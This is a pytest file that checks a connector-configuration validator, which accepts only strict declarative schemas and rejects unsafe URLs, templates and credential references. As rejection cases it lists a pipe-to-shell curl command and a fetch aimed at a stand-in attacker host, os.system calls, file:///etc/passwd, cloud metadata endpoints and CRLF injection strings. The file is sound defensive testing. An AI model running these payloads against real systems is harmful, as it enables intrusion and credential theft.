import json

import pytest
from srbg_api.connectors import (
    CONNECTOR_DEFINITIONS,
    ConnectorConfigRejected,
    ConnectorKind,
    preview_connector_config,
    validate_connector_config,
)

VALID_CONFIGS: dict[ConnectorKind, dict[str, object]] = {
    ConnectorKind.RSS_ATOM: {
        "feed_url": "https://feeds.example.test/road/rss.xml",
        "allowed_hosts": ["feeds.example.test", "docs.example.test"],
    },
    ConnectorKind.JSON_API: {
        "endpoint_url": "https://api.example.test/v1/notices",
        "allowed_hosts": ["api.example.test", "docs.example.test"],
        "items_pointer": "/data/items",
        "field_pointers": {
            "external_id": "/id",
            "url": "/url",
            "title": "/title",
            "published_at": "/published_at",
        },
        "pagination": "NONE",
        "credential_ref": "vault://source-connectors/example-api-read",
    },
    ConnectorKind.SITEMAP: {
        "sitemap_url": "https://www.example.test/sitemap.xml",
        "allowed_hosts": ["www.example.test"],
    },
    ConnectorKind.LIST_DETAIL: {
        "list_url": "https://www.example.test/notices/index.html",
        "allowed_hosts": ["www.example.test"],
        "item_selector": "article.item",
        "link_selector": "a.detail",
        "title_selector": "h2.title",
        "published_selector": "time.published",
        "max_items": 5,
    },
    ConnectorKind.DIRECT_PDF: {
        "document_urls": ["https://files.example.test/rules/bridge-safety.pdf"],
        "allowed_hosts": ["files.example.test"],
    },
    ConnectorKind.MANUAL_IMPORT: {
        "allowed_hosts": ["docs.example.test"],
        "url_import_enabled": True,
        "file_import_enabled": True,
        "allowed_file_types": ["HTML", "PDF", "ZIP"],
    },
}


def test_all_six_connector_definitions_are_versioned_strict_json_schemas() -> None:
    assert set(CONNECTOR_DEFINITIONS) == set(ConnectorKind)

    for kind, definition in CONNECTOR_DEFINITIONS.items():
        schema = definition.schema
        assert definition.kind is kind
        assert definition.definition_version == "1.0.0"
        assert definition.schema_version == "2020-12"
        assert schema["$schema"] == "https://json-schema.org/draft/2020-12/schema"
        assert schema["additionalProperties"] is False
        assert len(definition.schema_sha256) == 64


@pytest.mark.parametrize("kind", list(ConnectorKind))
def test_each_connector_accepts_only_its_declarative_contract(kind: ConnectorKind) -> None:
    validated = validate_connector_config(
        kind,
        VALID_CONFIGS[kind],
        source_allowed_hosts=tuple(VALID_CONFIGS[kind]["allowed_hosts"]),
    )

    assert validated.kind is kind
    assert validated.definition_version == "1.0.0"
    assert validated.document == VALID_CONFIGS[kind]


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("script", "import os; os.system('whoami')"),
        ("javascript", "fetch('https://attacker.invalid')"),
        ("shell", "curl https://attacker.invalid | sh"),
        ("template", "{{ response.next_url }}"),
        ("state", "ACTIVE"),
        ("rate_limit_per_minute", 1000),
        ("slo_minutes", 15),
        ("display_policy", "FULLTEXT"),
    ],
)
def test_unknown_code_governance_and_self_authorization_fields_are_rejected(
    field: str,
    value: object,
) -> None:
    document = dict(VALID_CONFIGS[ConnectorKind.RSS_ATOM])
    document[field] = value

    with pytest.raises(ConnectorConfigRejected, match="schema"):
        validate_connector_config(
            ConnectorKind.RSS_ATOM,
            document,
            source_allowed_hosts=("feeds.example.test", "docs.example.test"),
        )


@pytest.mark.parametrize(
    "feed_url",
    [
        "https://{{ runtime_host }}/rss.xml",
        "https://${SOURCE_HOST}/rss.xml",
        "file:///etc/passwd",
        "gopher://feeds.example.test/_stats",
        "javascript:alert(1)",
        "https://user:password@feeds.example.test/rss.xml",
        "https://feeds.example.test/rss.xml?api_key=plaintext-secret",
        "https://feeds.example.test/rss.xml?sig=plaintext-signature",
        "https://feeds.example.test/rss.xml?X-Amz-Credential=embedded",
        "https://feeds.example.test/rss.xml?X-Amz-Signature=embedded",
        "https://feeds.example.test/rss.xml?X-Goog-Credential=embedded",
        "https://feeds.example.test/rss.xml?X-Goog-Signature=embedded",
        "https://feeds.example.test/rss.xml?%2561pi_key=double-encoded-secret",
        "https://feeds.example.test/rss.xml?auth=plaintext-secret",
        "https://feeds.example.test/rss.xml?page=1",
        "http://127.0.0.1/rss.xml",
        "http://[::1]/rss.xml",
        "http://169.254.169.254/latest/meta-data",
        "http://168.63.129.16/metadata/instance",
    ],
)
def test_dynamic_dangerous_internal_and_credential_bearing_targets_are_rejected(
    feed_url: str,
) -> None:
    document = dict(VALID_CONFIGS[ConnectorKind.RSS_ATOM])
    document["feed_url"] = feed_url

    with pytest.raises(ConnectorConfigRejected):
        validate_connector_config(
            ConnectorKind.RSS_ATOM,
            document,
            source_allowed_hosts=("feeds.example.test", "docs.example.test"),
        )


def test_allowlist_is_exact_and_must_be_a_subset_of_server_policy() -> None:
    wildcard = dict(VALID_CONFIGS[ConnectorKind.RSS_ATOM])
    wildcard["allowed_hosts"] = ["*.example.test"]
    with pytest.raises(ConnectorConfigRejected, match="allowed host"):
        validate_connector_config(
            ConnectorKind.RSS_ATOM,
            wildcard,
            source_allowed_hosts=("feeds.example.test",),
        )

    overbroad = dict(VALID_CONFIGS[ConnectorKind.RSS_ATOM])
    with pytest.raises(ConnectorConfigRejected, match="source policy"):
        validate_connector_config(
            ConnectorKind.RSS_ATOM,
            overbroad,
            source_allowed_hosts=("feeds.example.test",),
        )


@pytest.mark.parametrize(
    "credential_ref",
    [
        "plaintext-secret",
        "env://API_KEY",
        "vault://other-scope/example",
        "vault://source-connectors/{{ name }}",
    ],
)
def test_only_controlled_secret_system_references_are_accepted(credential_ref: str) -> None:
    document = dict(VALID_CONFIGS[ConnectorKind.JSON_API])
    document["credential_ref"] = credential_ref

    with pytest.raises(ConnectorConfigRejected):
        validate_connector_config(
            ConnectorKind.JSON_API,
            document,
            source_allowed_hosts=("api.example.test", "docs.example.test"),
        )


def test_preview_is_normalized_and_never_returns_the_credential_reference() -> None:
    reference = "vault://source-connectors/example-api-read"
    preview = preview_connector_config(
        ConnectorKind.JSON_API,
        VALID_CONFIGS[ConnectorKind.JSON_API],
        source_allowed_hosts=("api.example.test", "docs.example.test"),
    )

    serialized = json.dumps(preview, sort_keys=True)
    assert reference not in serialized
    assert preview["config"]["credential_ref"] == "[configured]"
    assert preview["network_io_performed"] is False


def test_selector_and_json_pointer_grammars_reject_expressions() -> None:
    selector = dict(VALID_CONFIGS[ConnectorKind.LIST_DETAIL])
    selector["link_selector"] = "a[href={{ next_url }}]"
    with pytest.raises(ConnectorConfigRejected, match=r"selector|template expressions"):
        validate_connector_config(
            ConnectorKind.LIST_DETAIL,
            selector,
            source_allowed_hosts=("www.example.test",),
        )

    pointer = dict(VALID_CONFIGS[ConnectorKind.JSON_API])
    pointer["items_pointer"] = "$.data.items[*]"
    with pytest.raises(ConnectorConfigRejected, match="pointer"):
        validate_connector_config(
            ConnectorKind.JSON_API,
            pointer,
            source_allowed_hosts=("api.example.test", "docs.example.test"),
        )


@pytest.mark.parametrize("max_items", [0, 1, 11, "5", True])
def test_list_detail_cycle_limit_is_a_small_bounded_integer(max_items: object) -> None:
    document = dict(VALID_CONFIGS[ConnectorKind.LIST_DETAIL])
    document["max_items"] = max_items

    with pytest.raises(ConnectorConfigRejected, match="schema"):
        validate_connector_config(
            ConnectorKind.LIST_DETAIL,
            document,
            source_allowed_hosts=("www.example.test",),
        )


@pytest.mark.parametrize(
    "feed_url",
    [
        "https://feeds.example.test:not-a-port/rss.xml",
        "https://feeds.example.test:999999/rss.xml",
        "https://user%40example.test:password@feeds.example.test/rss.xml",
        "https://feeds.example.test/%0d%0aX-Injected:true",
        "https://feeds.example.test/rss.xml\x00ignored",
    ],
)
def test_malformed_ports_encoded_userinfo_and_control_characters_fail_closed(
    feed_url: str,
) -> None:
    document = dict(VALID_CONFIGS[ConnectorKind.RSS_ATOM])
    document["feed_url"] = feed_url

    with pytest.raises(ConnectorConfigRejected):
        validate_connector_config(
            ConnectorKind.RSS_ATOM,
            document,
            source_allowed_hosts=("feeds.example.test", "docs.example.test"),
        )


def test_trailing_dot_hosts_are_canonicalized_before_version_persistence() -> None:
    document = {
        "feed_url": "https://Feeds.Example.Test./road/rss.xml",
        "allowed_hosts": ["Feeds.Example.Test."],
    }

    validated = validate_connector_config(
        ConnectorKind.RSS_ATOM,
        document,
        source_allowed_hosts=("feeds.example.test",),
    )

    assert validated.document["allowed_hosts"] == ["feeds.example.test"]
    assert validated.document["feed_url"] == "https://feeds.example.test/road/rss.xml"


@pytest.mark.parametrize("pagination", ["NEXT_LINK", "CURSOR"])
def test_unimplemented_json_pagination_modes_fail_schema_validation(pagination: str) -> None:
    document = dict(VALID_CONFIGS[ConnectorKind.JSON_API])
    document["pagination"] = pagination
    document["next_pointer" if pagination == "NEXT_LINK" else "cursor_pointer"] = "/next"

    with pytest.raises(ConnectorConfigRejected, match="schema"):
        validate_connector_config(
            ConnectorKind.JSON_API,
            document,
            source_allowed_hosts=("api.example.test", "docs.example.test"),
        )
